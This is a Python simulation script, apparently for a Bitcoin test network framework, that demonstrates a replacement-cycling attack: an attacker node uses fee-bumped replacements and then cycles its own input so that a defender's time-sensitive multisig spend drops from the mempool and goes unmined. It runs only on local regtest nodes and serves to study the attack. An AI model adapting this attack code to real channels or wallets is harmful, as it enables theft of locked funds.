#!/usr/bin/env python3
from decimal import Decimal

from commander import Commander
from test_framework.key import ECKey
from test_framework.messages import (
    COIN,
    COutPoint,
    CTransaction,
    CTxIn,
    CTxInWitness,
    CTxOut,
    sha256,
)
from test_framework.script import (
    LEAF_VERSION_TAPSCRIPT,
    OP_0,
    OP_1,
    OP_2,
    OP_CHECKMULTISIG,
    OP_TRUE,
    SIGHASH_ALL,
    CScript,
    sign_input_segwitv0,
)
from test_framework.wallet import MiniWallet


class ReplacementCycling(Commander):
    def set_test_params(self):
        self.num_nodes = 2

    def get_witness_script(self):
        defender_pubkey = self.defender_seckey.get_pubkey()
        attacker_pubkey = self.attacker_seckey.get_pubkey()

        return CScript(
            [OP_1, defender_pubkey.get_bytes(), attacker_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG]  # type: ignore
        )

    def build_multisig_transaction(self, coins):
        witness_script = self.get_witness_script()
        self.log.info(f"Coins: {coins}")
        witness_program = sha256(witness_script)
        script_pubkey = CScript([OP_0, witness_program])  # type: ignore
        funding_tx = CTransaction()
        funding_tx.vin.append(CTxIn(COutPoint(int(coins["txid"], 16), coins["vout"]), b""))
        output_value = int(Decimal("0.8") * coins["value"] * COIN)
        funding_tx.vout.append(CTxOut(output_value, script_pubkey))
        funding_tx.rehash()

        self.defender_wallet.sign_tx(funding_tx)
        return funding_tx

    def __get_last_height_by_node(self, node):
        last_blockhash = node.getbestblockhash()
        block = node.getblock(last_blockhash)
        last_blockheight = block["height"]
        return last_blockheight

    def get_defender_last_last_height(self):
        return self.__get_last_height_by_node(self.defender)

    def get_attacker_last_height(self):
        return self.__get_last_height_by_node(self.attacker)

    def setup_multisig(self):
        self.log.info("Setting up multisig transaction")
        self.defender_seckey = ECKey()
        self.defender_seckey.set((1).to_bytes(32, "big"), True)
        self.attacker_seckey = ECKey()
        self.attacker_seckey.set((2).to_bytes(32, "big"), True)

        self.sync_all()
        last_blockheight = self.get_defender_last_last_height()

        coin_1 = self.defender_wallet.get_utxo()

        ab_funding_tx = self.build_multisig_transaction(coin_1)

        if ab_funding_tx.hash is None:
            raise Exception("ab_funding_tx.hash is None")

        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn "
            f"- Funded by: [{coin_1['txid'][0:7]} Coin 1 {coin_1['value']}]"
            f"- Output value: {ab_funding_tx.vout[0].nValue}"
        )

        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn "
            "- Signed by: Atacker & Defender "
            "- Atacker/Defender 2/2 multisig"
        )

        # Propagate and confirm funding transaction.
        ab_funding_txid = self.defender.sendrawtransaction(
            hexstring=ab_funding_tx.serialize().hex(), maxfeerate=0
        )
        self.log.info(
            f"@{last_blockheight} {ab_funding_tx.hash[0:7]} Funding Txn "
            "- Broadcasted by: Defender"
        )

        self.sync_all()

        assert ab_funding_txid in self.defender.getrawmempool()
        assert ab_funding_txid in self.attacker.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {ab_funding_txid[0:7]} Funding Txn " "- Seen in the mempool"
        )
        self.log.info(f"Funding txid: {ab_funding_txid}")
        self.generate(self.defender, 1)
        self.sync_all()
        self.validate_mined(ab_funding_tx, log_transaction_name="Multisig Txn")
        return ab_funding_tx

    def validate_mined(
        self, pending_transaction: CTransaction, node=None, log_transaction_name=""
    ) -> CTransaction:
        if node is None:
            node = self.defender
        if pending_transaction.hash is None:
            raise Exception("pending_transaction.hash is None")

        self.log.info("Checking if transaction is confirmed in a block")
        last_block = node.getblock(node.getbestblockhash())
        if pending_transaction.hash not in [tx for tx in last_block["tx"]]:
            raise Exception(f"Transaction {pending_transaction.hash} not found in the latest block")

        self.log.info(
            f"@{self.__get_last_height_by_node(node)} {pending_transaction.hash[0:7]} {log_transaction_name} "
            "- Confirmed"
        )
        return pending_transaction

    def setup_attacker_junk_transaction(self):
        self.log.info("Setting up attacker transactions")
        utxos = self.attacker_wallet.get_utxos(confirmed_only=True, mark_as_spent=False)
        if len(utxos) < 1:
            raise Exception("Attacker wallet has no confirmed UTXOs to spend")

    def fill_attacker_wallet(self):
        last_blockheight = self.get_defender_last_last_height()
        self.log.info(f"@{last_blockheight} - Filling attacker wallet")
        coins = self.defender_wallet.get_utxo()
        per_output_amount = int(((coins["value"] // 10) * COIN) - 100)
        self.log.info(f"Per output amount: {per_output_amount}")
        tx = CTransaction()
        tx.vin.append(CTxIn(COutPoint(int(coins["txid"], 16), coins["vout"]), b""))
        for _i in range(10):
            tx.vout.append(
                CTxOut(per_output_amount, bytearray(self.attacker_wallet.get_scriptPubKey()))  # type: ignore
            )

        self.defender_wallet.sign_tx(tx)
        tx.rehash()
        txid = self.defender.sendrawtransaction(hexstring=tx.serialize().hex(), maxfeerate=0)
        self.log.info(
            f"@{last_blockheight} {txid[0:7]} Attacker tx UTXOs " "- Broadcasted by: Defender"
        )

        self.sync_all()

        assert txid in self.defender.getrawmempool()
        assert txid in self.attacker.getrawmempool()
        self.log.info(f"@{last_blockheight} {txid[0:7]} Attacker tx UTXOs " "- Seen in the mempool")
        self.log.info(f"Funding txid: {txid}")
        self.generate(self.defender, 1)
        self.sync_all()
        self.validate_mined(tx, log_transaction_name="Attacker tx UTXOs")
        return tx

    def build_defender_transaction(self, multsig: CTransaction, fee: int = 200) -> CTransaction:
        amount = multsig.vout[0].nValue - 200
        if multsig.hash is None:
            raise Exception("multsig.hash is None")
        tx = CTransaction()
        tx.vin.append(CTxIn(COutPoint(int(multsig.hash, 16), 0), b""))
        tx.vout.append(CTxOut(amount, bytearray(self.defender_wallet.get_scriptPubKey())))  # type: ignore
        tx.wit.vtxinwit.append(CTxInWitness())
        tx.wit.vtxinwit[0].scriptWitness.stack = [self.get_witness_script()]

        sign_input_segwitv0(
            tx,
            0,
            self.get_witness_script(),
            multsig.vout[0].nValue,
            self.defender_seckey,
            SIGHASH_ALL,
        )
        tx.wit.vtxinwit[0].scriptWitness.stack.insert(0, b"")  # type: ignore
        return tx

    def spend_defender_transaction(self, multsig: CTransaction) -> CTransaction:
        last_blockheight = self.get_defender_last_last_height()
        self.log.info(f"@{last_blockheight} - Spending defender transaction")
        if multsig.hash is None:
            raise Exception("multsig.hash is None")
        tx = self.build_defender_transaction(multsig)
        txid = self.defender_wallet.sendrawtransaction(
            from_node=self.defender, tx_hex=tx.serialize().hex()
        )
        self.log.info(
            f"@{last_blockheight} {txid[0:7]} Spend Tx "
            "- Broadcasted by: Defender"
            f"- wtxid: {tx.getwtxid()[0:7]}"
            f"- amount: {tx.vout[0].nValue}"
        )

        self.sync_all()

        assert txid in self.defender.getrawmempool()
        assert txid in self.attacker.getrawmempool()
        self.log.info(f"@{last_blockheight} {txid[0:7]} Spend Tx " "- Seen in the mempool")
        return tx

    def build_attacker_transaction(
        self, attacker_tx: CTransaction, multisig_tx: CTransaction, attacker_index: int = 0
    ):
        if multisig_tx.hash is None:
            raise Exception("multisig_tx.hash is None")
        if attacker_tx.hash is None:
            raise Exception("attacker_tx.hash is None")
        amount = multisig_tx.vout[0].nValue + attacker_tx.vout[attacker_index].nValue - 1000

        attack_tx = CTransaction()
        attack_tx.vin.append(CTxIn(COutPoint(int(multisig_tx.hash, 16), 0), b""))
        attack_tx.vin.append(CTxIn(COutPoint(int(attacker_tx.hash, 16), attacker_index), b""))
        attack_tx.vout.append(
            CTxOut(amount, bytearray(self.attacker_wallet.get_scriptPubKey()))  # type: ignore
        )
        attack_tx.wit.vtxinwit.append(CTxInWitness())
        attack_tx.wit.vtxinwit.append(CTxInWitness())
        attack_tx.wit.vtxinwit[0].scriptWitness.stack = [self.get_witness_script()]
        sign_input_segwitv0(
            attack_tx,
            0,
            self.get_witness_script(),
            multisig_tx.vout[0].nValue,
            self.attacker_seckey,
            SIGHASH_ALL,
        )
        attack_tx.wit.vtxinwit[0].scriptWitness.stack.insert(0, b"")  # type: ignore
        internal_key = (1).to_bytes(32, "big")
        attack_tx.wit.vtxinwit[1].scriptWitness.stack = [
            CScript([OP_TRUE]),  # type: ignore
            bytes([LEAF_VERSION_TAPSCRIPT]) + internal_key,
        ]

        attack_tx.rehash()
        return attack_tx

    def replace_with_attacker(
        self,
        multisig_tx: CTransaction,
        defender_spend_tx: CTransaction,
        attacker_tx: CTransaction,
        attacker_index: int = 0,
    ):
        last_blockheight = self.get_defender_last_last_height()
        self.log.info(f"@{last_blockheight} Start cycling attack...")
        attack_tx = self.build_attacker_transaction(attacker_tx, multisig_tx, attacker_index)
        attack_txid = self.attacker_wallet.sendrawtransaction(
            from_node=self.attacker, tx_hex=attack_tx.serialize().hex()
        )
        self.log.info(
            f"@{last_blockheight} {attack_txid[0:7]} Attack Tx "
            "- Broadcasted by: Attacker"
            f"- wtxid: {attack_tx.getwtxid()}"
        )

        self.sync_all()

        assert attack_txid in self.defender.getrawmempool()
        assert attack_txid in self.attacker.getrawmempool()
        if defender_spend_tx.hash is None:
            raise Exception("defender_spend_tx.hash is None")
        assert defender_spend_tx.hash not in self.defender.getrawmempool()
        assert defender_spend_tx.hash not in self.attacker.getrawmempool()
        self.log.info(f"@{last_blockheight} {attack_txid[0:7]} Attack Tx " "- Seen in the mempool")
        self.log.info(
            f"@{last_blockheight} {defender_spend_tx.hash[0:7]} Spend Tx "
            "- Not seen in the mempool"
        )
        return attack_tx

    def build_cylcing_attacker_transaction(
        self, attacker_tx: CTransaction, attacker_index: int = 0
    ):
        if attacker_tx.hash is None:
            raise Exception("attacker_tx.hash is None")
        amount = attacker_tx.vout[attacker_index].nValue - 2000
        attack_tx = CTransaction()
        attack_tx.vin.append(CTxIn(COutPoint(int(attacker_tx.hash, 16), attacker_index), b""))
        attack_tx.vout.append(
            CTxOut(amount, bytearray(self.attacker_wallet.get_scriptPubKey()))  # type: ignore
        )
        attack_tx.wit.vtxinwit.append(CTxInWitness())

        internal_key = (1).to_bytes(32, "big")
        attack_tx.wit.vtxinwit[0].scriptWitness.stack = [
            CScript([OP_TRUE]),  # type: ignore
            bytes([LEAF_VERSION_TAPSCRIPT]) + internal_key,
        ]

        attack_tx.rehash()
        return attack_tx

    def cycle_attacker_transaction(
        self,
        attacker_tx: CTransaction,
        additional_attacker_utxos: CTransaction,
        attacker_index: int = 0,
    ):
        last_blockheight = self.get_defender_last_last_height()
        self.log.info(f"@{last_blockheight} Cycling attacker transaction...")
        cycling_tx = self.build_cylcing_attacker_transaction(
            additional_attacker_utxos, attacker_index
        )
        cycling_txid = self.attacker_wallet.sendrawtransaction(
            from_node=self.attacker, tx_hex=cycling_tx.serialize().hex()
        )
        self.log.info(
            f"@{last_blockheight} {cycling_txid[0:7]} Cycling Tx "
            "- Broadcasted by: Attacker"
            f"- wtxid: {cycling_tx.getwtxid()}"
        )

        self.sync_all()

        assert cycling_txid in self.defender.getrawmempool()
        assert cycling_txid in self.attacker.getrawmempool()
        if additional_attacker_utxos.hash is None:
            raise Exception("additional_attacker_utxos.hash is None")
        assert additional_attacker_utxos.hash not in self.defender.getrawmempool()
        assert additional_attacker_utxos.hash not in self.attacker.getrawmempool()
        self.log.info(
            f"@{last_blockheight} {cycling_txid[0:7]} Cycling Tx " "- Seen in the mempool"
        )
        self.log.info(
            f"@{last_blockheight} {additional_attacker_utxos.hash[0:7]} Attack Tx "
            "- Not seen in the mempool"
        )
        return cycling_tx

    def validate_defender_tx_not_mined(self, defender_tx: CTransaction):
        node = self.defender
        if defender_tx.hash is None:
            raise Exception("defender_tx.hash is None")

        self.log.info("Checking if transaction is confirmed in a block")
        last_block = node.getblock(node.getbestblockhash())
        if defender_tx.hash in [tx for tx in last_block["tx"]]:
            raise Exception(
                f"Transaction {defender_tx.hash} found in the latest block, attacker failed."
            )
        self.log.info(
            f"@{self.__get_last_height_by_node(node)} {defender_tx.hash[0:7]} Defender Tx -"
            "- Not confirmed in latest block"
        )

    def test_attacker_replaces_and_can_be_mined(self, additional_attacker_utxos: CTransaction):
        # This test scenario is the basic test of RBF used in other tests.
        # Given our multisig transaction, denfeder tries to spend it:
        #           Defender
        #              |
        #           Multisig
        #               \
        #             Defender
        #
        # Then attacker replaces the transaction with its own transaction and another input
        # that spends the same transaction, but with a different output
        #
        #           Defender
        #              |
        #           Multisig   AttackerAdittionalUtxos[n]
        #               \     /
        #             Attacker
        #
        # Then we mine the new transaction and check if it is confirmed in a block.

        self.log.info("\t===== First test, attacker replaces and can be mined =====")
        multisig_tx = self.setup_multisig()
        defender_spend_tx = self.spend_defender_transaction(multisig_tx)
        attacker_tx = self.replace_with_attacker(
            multisig_tx, defender_spend_tx, additional_attacker_utxos
        )
        self.generate(self.defender_wallet, 1)
        self.validate_mined(
            attacker_tx, log_transaction_name="Attacker tx that replaces defender tx"
        )

    def test_cycling_out_defender_tx(self, additional_attacker_utxos: CTransaction):
        # This test scenario is a basic replacement cycling attack.
        # Given our multisig transaction that we assume time sensitive, denfeder tries to spend it:
        #           Defender
        #              |
        #           Multisig
        #               \
        #             Defender
        #
        # Then attacker replaces the transaction broadcasting the same transaction plus a additional input index 1
        # to a different output:
        #
        #           Defender
        #              |
        #           Multisig   AttackerAdittionalUtxos[1]
        #               \     /
        #             Attacker
        #
        # Then we cycle out the attacker transaction broadcasting the additional input bumping with fee.
        # with the new transaction.
        #
        #           Defender
        #              |
        #           Multisig   AttackerAdittionalUtxos[1]
        #                              \
        #                           Attacker
        #
        # Multisig still can be spend by the defender or the attacker, but it is pinned to the mempool.
        self.log.info(
            "\t===== Now we try to cycle attacker transaction, trying to pinning it and mine the new one ====="
        )
        multisig_tx = self.setup_multisig()
        defender_spend_tx = self.spend_defender_transaction(multisig_tx)
        attacker_tx = self.replace_with_attacker(
            multisig_tx, defender_spend_tx, additional_attacker_utxos, 1
        )
        cycling_tx = self.cycle_attacker_transaction(attacker_tx, additional_attacker_utxos, 1)
        self.generate(self.defender_wallet, 1)
        self.validate_mined(
            cycling_tx, log_transaction_name="Cycling attacker tx that replaces defender tx"
        )
        self.validate_defender_tx_not_mined(defender_spend_tx)
        mempool_accept_result = self.defender.testmempoolaccept(
            rawtxs=[defender_spend_tx.serialize().hex()], maxfeerate=0
        )
        assert mempool_accept_result[0]["allowed"]

    def run_test(self):
        # Simple test to demostrate replacement cycling time sensitive transactions
        # For ease of demostration we are using 2 nodes and wallets, 1 attacker and 1 defender
        # that share 1 multisig utxo that we can assume that is time sensitive.
        #           Defender
        #              |
        #           Multisig
        #           /      \
        #     Attacker    Defender
        # To setup the test we mine 101 blocks to fill the defender wallet with coins
        # and then we fill the attacker wallet with coins that we can use to replace
        # the defender transaction.
        #
        self.log.info("Starting replacement cycling")
        self.defender = self.nodes[0]
        self.attacker = self.nodes[1]
        self.defender_wallet = MiniWallet(self.defender)
        self.attacker_wallet = MiniWallet(self.attacker)
        self.generate(self.defender_wallet, 101)
        additional_attacker_utxos = self.fill_attacker_wallet()
        self.setup_attacker_junk_transaction()
        self.log.info(f"Balance attacker {self.attacker_wallet.get_balance()}")
        self.log.info(f"Balance defender {self.defender_wallet.get_balance()}")

        self.test_attacker_replaces_and_can_be_mined(additional_attacker_utxos)
        self.test_cycling_out_defender_tx(additional_attacker_utxos)


def main():
    ReplacementCycling().main()


if __name__ == "__main__":
    main()
